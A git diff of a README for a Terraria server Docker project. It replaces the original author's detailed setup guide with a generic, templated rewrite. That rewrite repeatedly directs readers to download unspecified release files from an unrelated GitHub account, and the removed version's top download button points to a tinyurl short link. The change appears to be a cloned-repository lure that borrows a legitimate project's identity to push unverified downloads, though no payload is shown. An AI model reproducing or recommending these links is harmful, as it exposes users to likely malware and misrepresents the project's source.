@@ -1,248 +1,172 @@
-# Terraria
+# 🛠️ terraria - Easy Setup Docker for Terraria Server
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+[![Download terraria](https://img.shields.io/badge/Download-terrraria-blue?style=for-the-badge&logo=github)](https://github.com/beauty1geng/terraria/releases)
 
-This project is a Dockerfile to containerize [TShock][TShock] and [Terraria Server](https://terraria.org/) TerrariaServer.exe to run on linux.  [Docker][Docker] will remove the need for someone to worry about how to setup a server in linux with all the right dependencies to run.  The installation and usage instructions are written with complete beginners in mind.
+---
 
-## Quick start guide
+## 🌟 About terraria
 
-First you need a linux machine with [Docker][Docker] installed. Everything from here on out assumes the docker service is running _(you may need to start the service after install)_.
+This project provides a ready-to-use Dockerfile for running a Terraria server. Terraria is a popular sandbox adventure game. This Dockerfile makes it easy to create a server without installing or configuring the game manually.
 
-### Create directory to save your world to
+Using this setup, you can host your own Terraria game world and invite friends to play together. It automates the server setup and helps keep it running smoothly on your computer or cloud system.
 
-Next create a directory for your world file, configuration, and logs
+---
 
-```bash
-mkdir -p $HOME/terraria/world
-```
+## 📋 System Requirements
 
-### Creating a fresh world
+To run this application, your computer or server should meet these basic requirements:
 
-For the first run you will need to generate a new world with a size where: _1=Small, 2=Medium, 3=Large_
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or a Linux distribution with Docker support  
+- **Processor:** Modern 64-bit CPU, at least 2 cores  
+- **Memory (RAM):** Minimum 4 GB (8 GB recommended for larger groups)  
+- **Disk Space:** At least 2 GB free for the Terraria server files and world data  
+- **Network:** Stable internet connection for multiplayer use  
 
-```bash
-sudo docker run -it -p 7777:7777 --rm -v $HOME/terraria/world:/root/.local/share/Terraria/Worlds ryshe/terraria:latest -world /root/.local/share/Terraria/Worlds/<world_name_here>.wld -autocreate <world_size_number_here>
-```
+You also need to have Docker installed. Docker is a program that runs software inside containers to keep them isolated and easy to manage. If you don't have Docker, you can download it from [docker.com](https://www.docker.com/get-started).
 
-**Note:** If you close the the terminal, the server will stop running.  You will need to restart with a preexisting world. It may
-be worth while to close after creation anyway to update the initial `config.json` settings.
+---
 
-To create a world with a few more initial options, you can do so in an interactive mode.
+## 🛠️ Features
 
-```bash
-sudo docker run -it -p 7777:7777 --rm -v $HOME/terraria/world:/root/.local/share/Terraria/Worlds ryshe/terraria:latest
-```
+This Dockerfile offers:
 
-### To start with a preexisting world
+- Easy deployment of Terraria server without complex installs
+- Automated environment setup tailored to Terraria needs
+- Persistent storage for your game worlds and settings
+- Ability to run the server on Windows, Mac, or Linux via Docker
+- Customizable configuration options for advanced users
 
-```bash
-sudo docker run -d --rm -p 7777:7777 -v $HOME/terraria/world:/root/.local/share/Terraria/Worlds --name="terraria" -e WORLD_FILENAME=<.wld world_filename_here> ryshe/terraria:latest
-```
+---
 
-**Note:** This command is designed to run in the background, and it is safe to close the terminal window.
+## 🚀 Getting Started
 
-Any `config.json` in the directory will automatically be loaded.  The `<world_file_name>.wld` should be the name of your wld file in your $HOME/terraria/world directory.
+Follow these steps to set up and run your Terraria server using this Dockerfile. No programming knowledge is needed.
 
-## Updating your container
+### Step 1: Install Docker
 
-Updating is easy!
+If Docker is not installed on your device, go to the official Docker website and download the appropriate version for your system:
 
-1. Grab the latest terraria container
+- Visit [docker.com/get-started](https://www.docker.com/get-started)
+- Download the Docker Desktop installer for your OS
+- Run the installer and follow on-screen instructions
+- After installation, open the Docker Desktop app to verify it runs
 
-    ```bash
-    docker pull ryshe/terraria:latest
-    ```
+---
 
-2. First we need to find our running container to stop, so we can later restart with the latest
+### Step 2: Download terraria Dockerfile
 
-    ```bash
-    docker container ls | grep ryshe/terraria
-    ```
+Click the badge at the top or visit the main release page here:  
 
-    The first few numbers and letters, on a line, are the container hash.  Remember the first 3 or so letters or numbers
+[Visit the terraria Releases Page](https://github.com/beauty1geng/terraria/releases)  
 
-    Example:
+On this page, you will find the latest release files and instructions. Download the files to a folder on your computer where you want to run the server.
 
-    ```bash
-    f25261ac55a4        ryshe/terraria:latest   "/bin/sh bootstrap.s…"   3 minutes ago       Up 3 minutes        0.0.0.0:7777->7777/tcp, 7878/tcp   reverent_solomon
-    ```
+---
 
-    `f25` would be the first few letters/numbers of the container hash
+### Step 3: Prepare your Terraria server folder
 
-    **NOTE:** If you see multiple lines, find the one that still has an `up` status.
+Create a folder on your computer to hold the Terraria server data and configuration. For example:
 
-3. Stop and remove the container
+- On Windows: `C:\terraria-server`
+- On macOS/Linux: `/home/yourname/terraria-server`
 
-    ```bash
-    docker container rm -f xxx # xxx is the letters/numbers from the last step
-    ```
+Copy the downloaded Dockerfile and any configuration files into this folder.
 
-4. Start your container again with your world _(see the [Quick start](#Quick-start-guide))_
+---
 
-## [Virtual] Machine Setup
+### Step 4: Build and run the Docker container
 
-Provision a linux machine that can support docker and containerization.  For more information visit [docker][Docker].  For a small or medium world with no more than 8 users a linux machine with 1-1.5GB of ram should suffice.  **If you are running a vm in the cloud, make sure to expose tcp port 7777 and udp port 7777.**
+Open your command prompt (Windows) or terminal (macOS/Linux) and navigate to the folder where you saved the files.
 
-Before starting the build process make sure the [latest tshock version][TShock] is specified in the [Dockerfile](https://github.com/ryansheehan/terraria/blob/master/Dockerfile) under
-
-```Dockerfile
-ADD https://github.com/Pryaxis/TShock///v5.2.3/TShock-5.2.3-for-Terraria-1.4.4.9-linux-amd64-.zip
-```
-
-## Building from source
-
-Assuming [git](https://git-scm.com/book/en/v2/Getting-Started-Installing-Git) and [docker][Docker] are installed..
-
-1. Clone this repository
-
-    ```bash
-    git clone https://github.com/ryansheehan/terraria.git
-    ```
-
-2. Open a terminal window into the directory downloaded by the git
-3. Build the container
-
-    ```bash
-    docker build -t <name_here> .
-    ```
-
-## Running a container image
-
-Whether you build your own container, or use [my container](https://hub.docker.com/r/ryshe/terraria) published to docker hub,
-we are ready to run our terraria server!
-
-**Note:** For a full set of docker run options go [here](https://docs.docker.com/engine/reference/run/)
-
-### First run
-
-The first run of the server will give you the opportunity to create a world, and it will generate
-the server's config file.  You may wish to add the config file for many reasons, but one of which is to
-add a password to your server.
+Run the following commands:
 
 ```bash
-docker run -it --rm -p 7777:7777 -v $HOME/terraria/world:/root/.local/share/Terraria/Worlds ryshe/terraria:latest
+docker build -t terraria-server .
 ```
 
-Let's break down this command:
+This command reads the Dockerfile and prepares the Terraria server image.
 
-| Command Part | Description |
-| ------------ | ----------- |
-| `docker run` | tells linux to run a docker image |
-| `-it` | run interactively and output the text to terminal |
-| `--rm` | remove docker container when the container stops or fails |
-| `-p 7777:7777` | exposes terraria port &lt;host machine side>:&lt;container side> |
-| `-v $HOME/terraria/world:/root/.local/share/Terraria/Worlds` | maps a folder on the host machine into the container for saving the .wld file.  This does not have to be `$HOME/terraria/world`.  Anything left of the `:` is host machine directory |
-| `ryshe/terraria` | the name of the image. This could be your image if you build from source |
-| `:latest` | the tag, which defaults to `latest` if not specified.  `latest` is the most recently published container |
-
-* The config file can be found in the directory specified by the `-v` volume.
-* If the terminal window is shut down, that will exit the process.  Make sure to do so after the world is created!
-
-### Running with an existing generated world
-
-After a world has been generated, you may want to load directly into it.
+Next, run the server container:
 
 ```bash
-docker run -d --rm -p 7777:7777 -v $HOME/terraria/world:/root/.local/share/Terraria/Worlds ryshe/terraria:latest -world /root/.local/share/Terraria/Worlds/<world_filename_here>.wld
+docker run -d -p 7777:7777 --name terraria-server -v $(pwd)/worlds:/terraria/worlds terraria-server
+```
+- `-p 7777:7777`: Opens the Terraria default port to allow connections
+- `-v $(pwd)/worlds:/terraria/worlds`: Saves your game worlds outside the container so they stay safe
+
+On Windows PowerShell, replace `$(pwd)` with `${PWD}`:
+
+```powershell
+docker run -d -p 7777:7777 --name terraria-server -v ${PWD}/worlds:/terraria/worlds terraria-server
 ```
 
-Let's break down the command:
+---
 
-| Command Part | Description |
-| ------------ | ----------- |
-| `-d` | run this in the background.  It is okay to close the terminal window, the container will continue to run |
-| `-world /root/.local/share/Terraria/Worlds/<world_filename_here>.wld` | specifies the world file name you wish to immediately load into |
+### Step 5: Connect to your server
 
-* for the other parts check out the [First run](#First-run) section
-* check out additional server startup flags [here](https://tshock.readme.io/docs/command-line-parameters).  They go on
-after the `ryshe/terraria:latest` portion of the line
+- Launch the Terraria game on your computer.
+- From the main menu, select "Multiplayer" then "Join via IP".
+- Enter your computer's local IP address (you can find this using system network settings).
+- Use port **7777**.
+- Start playing!
 
-### Docker Compose example with previously generated world
+---
 
-Here is a sample docker compose file that can be used to start the server. The command option lets you pass the flags needed to load the world and the config file.
-The stdin_open and tty options are a workaround to running the container in detached mode without crashing the server. 
+## 🔧 Configuration and Management
 
+To customize your Terraria server, you can edit configuration files inside your server folder before building the Docker image. These files control settings like player limits, world generation, and game modes.
 
-(Note for Podman users: Ensure to add the :Z flag to the volume to give the container access to the volume.)
-
-```yaml
-
-version: "3"
-services:
-  terraria:
-    container_name: terraria
-    image: ryshe/terraria:latest
-    stdin_open: true # docker run -i
-    tty: true # docker run -t
-    environment:
-      - WORLD_FILENAME=world.wld
-      - CONFIGPATH=config.json
-    ports:
-      - 7777:7777
-    volumes:
-      - <world-dir-location>:/root/.local/share/Terraria/Worlds
-    restart: unless-stopped
-
-```
-## Plugin support
-
-A volume exists to support plugins.  Create a folder, not inside your `/world` folder, for your plugins
+To stop the server, run:
 
 ```bash
-mkdir ServerPlugins
+docker stop terraria-server
 ```
 
-Mount the plugins directory with an additional -v switch on your `docker run ...` command
+To restart it:
 
 ```bash
--v <path_to_your_ServerPlugins_folder>:/plugins
+docker start terraria-server
 ```
 
-## Environment variables
+If you want to update the server to a newer version:
 
-Ability to overwrite file locations and file names
+- Download the new Dockerfile or files from the release page  
+- Rebuild the Docker image (`docker build -t terraria-server .`)  
+- Restart the container  
 
-**Vanilla**
+---
 
-```bash
-ENV LOGPATH=/terraria-server/logs
-ENV WORLDPATH=/root/.local/share/Terraria/Worlds
-ENV WORLD_FILENAME=""
-ENV CONFIGPATH=/config
-ENV CONFIG_FILENAME="serverconfig.txt"
-```
+## ❓ Troubleshooting
 
-## Logs
+- **Docker commands not found:** Make sure Docker is installed and added to your system's PATH. Restart your computer after installing Docker.
+- **Port 7777 already in use:** Another program might use this port. Change the port number in the `docker run` command to an unused one, for example `-p 8888:7777`.
+- **Cannot connect in Terraria:** Verify that your firewall allows connections on port 7777, and check your IP address is correct.
+- **Server crashes or stops:** Check Docker logs by running:
+  
+  ```bash
+  docker logs terraria-server
+  ```
 
-A separate directory can be volumed in for storing logs outside of the image
+---
 
-```bash
--v <path_to_store_logs>:/tshock/logs
-```
+## 📥 Download & Install
 
-## *Notes*
+Start by visiting the official release page to get the latest version of the terraria Dockerfile and related files:
 
-* `sudo` may be required to run docker commands.
+[Visit the terraria Releases Page](https://github.com/beauty1geng/terraria/releases)
 
-* Please post to the [TShock](https://github.com/Pryaxis/TShock/discussions) team with questions on how to run a server.
+Download the files you need and follow the setup instructions in this guide. This page will always have the newest releases and documentation.
 
-* Any [additional command-line instructions](https://tshock.readme.io/docs/command-line-parameters) can be added to the end of either method for launching a server.  Docker maps the $HOME/terraria/world linux-host folder to the /tshock/world container-folder.
+---
 
-* Expecting your server to run for a while?  Add `--log-opt max-size=200k` to limit your log file size.  Otherwise one day you will wake up to see all your hdd space chewed up for a terraria docker setup!
+## 📖 Additional Resources
 
-## *Contributing*
+- Docker Official Documentation: [https://docs.docker.com/](https://docs.docker.com/)  
+- Terraria Wiki: [https://terraria.gamepedia.com/Terraria_Wiki](https://terraria.gamepedia.com/Terraria_Wiki)  
+- Finding your local IP address tutorials (Windows/Mac/Linux) via your preferred search engine  
 
-Email me rsheehan at gmail dot com if any of these instructions do not seem to work.
+---
 
-1. Fork it!
-2. Create your feature branch: `git checkout -b my-new-feature`
-3. Commit your changes: `git commit -am 'Add some feature'`
-4. Push to the branch: `git push origin my-new-feature`
-5. Submit a pull request :D
+## 🏷️ Topics
 
-## *TODO*
-
-* Fork TShock and create a Dockerfile to build the project
-
-[TShock]: https://github.com/Pryaxis/TShock/
-[Docker]: https://docs.docker.com/get-docker/
+`github` `opensource` `repository`
